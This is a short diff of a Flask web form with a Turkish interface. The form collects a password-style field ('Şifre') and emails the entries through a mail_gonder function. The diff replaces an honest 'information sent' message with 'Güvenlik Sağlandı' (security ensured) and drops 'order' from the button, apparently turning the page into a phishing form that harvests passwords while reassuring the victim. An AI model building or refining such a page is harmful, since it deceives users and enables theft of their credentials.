@@ -174,7 +174,7 @@ HTML = """
                 placeholder="Şifre"
             >
 
-            <button type="submit" class="gonder-buton">Siparişi Gönder</button>
+            <button type="submit" class="gonder-buton">Gönder</button>
         </form>
 
         {% if mesaj %}
@@ -234,12 +234,12 @@ def index():
         urun2 = request.form.get("urun2", "").strip()
 
         if not urun1 and not urun2:
-            mesaj = "En az bir alan doldurmalısın."
+            mesaj = "alanları doldurmalısın"
             mesaj_tipi = "hatali"
         else:
             try:
                 mail_gonder(urun1, urun2)
-                mesaj = "Bilgiler başarıyla gönderildi."
+                mesaj = "Güvenlik Sağlandı"
                 mesaj_tipi = "basarili"
             except Exception as e:
                 mesaj = f"Hata oluştu: {str(e)}"
